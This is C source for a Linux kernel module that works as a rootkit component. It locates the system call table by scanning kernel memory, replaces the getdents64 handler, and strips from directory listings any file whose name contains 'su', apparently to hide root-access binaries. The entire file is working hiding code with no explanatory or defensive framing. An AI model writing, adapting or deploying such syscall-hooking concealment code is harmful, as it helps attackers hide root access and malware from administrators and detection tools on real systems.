#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>
#include <asm/processor.h>
#include "dumpcode.h"

unsigned long **sys_call_table;

static unsigned long **find_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *) sys_close) 
			return sct;

		offset += sizeof(void *);
	}

	return NULL;
}

long (*orig_sys_getdents64) (unsigned int fd,
                                struct linux_dirent64 __user *dirent,
                                unsigned int count);

asmlinkage long my_sys_getdents64(unsigned int fd,
                                struct linux_dirent64 __user *dirent,
                                unsigned int count)
{
	int offset, copyret;
	struct linux_dirent64 *td1, *td2, *cur, *prev;
	unsigned long ret, tmp;
	char *ptr;
	
	ret = orig_sys_getdents64(fd, dirent, count);
	if(ret <= 0)
		return ret;
	
	if((td2 = kmalloc(ret, GFP_KERNEL)) == NULL)
		goto out;

	copyret = copy_from_user(td2, dirent, ret);

	td1 = td2;
	ptr = (char *)td2;
	tmp = ret;
	prev = NULL;

	while(ptr < (char *)td1 + tmp)
 	{
		cur = (struct linux_dirent64 *) ptr;
		offset = cur->d_reclen;

		printk("Searching %s\n", cur->d_name);
		if(strstr(cur->d_name, "su") != NULL) {
			if(!prev) {
				ret -= offset;
				td2 = (struct linux_dirent64 *) ((char *)td1 + offset);
			} else {
				prev->d_reclen += offset;
				memset(cur, 0, offset);
			}
		} else {
			prev = cur;
		}
		ptr += offset;
	}

	copyret = copy_to_user((void *)dirent, (void *)td2, ret);
	kfree(td1);

out:
	return ret;
}


static int init_hideroot(void)
{
	printk("Hooking...\n");
	sys_call_table = find_sys_call_table();
	printk("%p\n", sys_call_table);
	orig_sys_getdents64 = (void*) sys_call_table[__NR_getdents64];
	sys_call_table[__NR_getdents64] = (unsigned long*) my_sys_getdents64;
	return 0;
}

static void cleanup_hideroot(void)
{
	printk("Quitting hider\n");
	sys_call_table[__NR_getdents64] = (unsigned long*) orig_sys_getdents64;
}

module_init(init_hideroot);
module_exit(cleanup_hideroot);

MODULE_LICENSE("GPL");
